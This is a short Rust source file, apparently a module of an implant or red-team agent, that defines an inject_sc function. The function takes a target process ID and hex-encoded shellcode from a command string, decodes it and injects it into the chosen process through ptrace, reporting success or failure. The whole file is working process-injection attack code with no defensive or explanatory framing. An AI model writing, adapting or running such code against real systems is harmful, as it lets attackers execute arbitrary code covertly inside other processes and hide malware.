extern crate process_injection;

use std::str::FromStr;

use process_injection::*;

pub fn inject_sc(cmd_arg: String) -> (String, String) {
    //println!("cmd_arg: {:#?}", cmd_arg);
    let mut iter = cmd_arg.split_whitespace();
    let process_pid = iter.next(); // the process PID in which to inject
    let shellcode = iter.next(); // the shellcode to inject

    // We need to make sure that we get a handle to a process, in this case, ourselves
    let pid: i32 = match process_pid {
        None => {std::process::id() as i32},
        Some(pid) => {<i32 as FromStr>::from_str(pid).unwrap()},
    };

    let shellcode_str: &str = match shellcode {
        None => {"90909090"},
        Some(ref sc) => {sc},
    };

    let len_shellcode: usize;
    if shellcode_str.len() % 2 == 0 {
        len_shellcode = shellcode_str.len() / 2;
    }
    else {
        len_shellcode = (shellcode_str.len() + 1)  / 2 ;
    }

    //let decoded = <[u8; len_shellcode]>::from_hex(sc).expect("Decoding failed");
    let sc = hex::decode(shellcode_str).expect("Decoding failed");

    let inject = ptrace_inject(pid, sc, len_shellcode);
    let result = match inject {
        Ok(true) => {
            ("shellcode launched: success".to_string(), "".to_string())
        }, 
        Ok(false) => {
            ("shellcode launched: failed".to_string(), "".to_string())
        },
        Err(_e) => {
            ("".to_string(), "Error launching shellcode".to_string())
        }
    };

    result
}

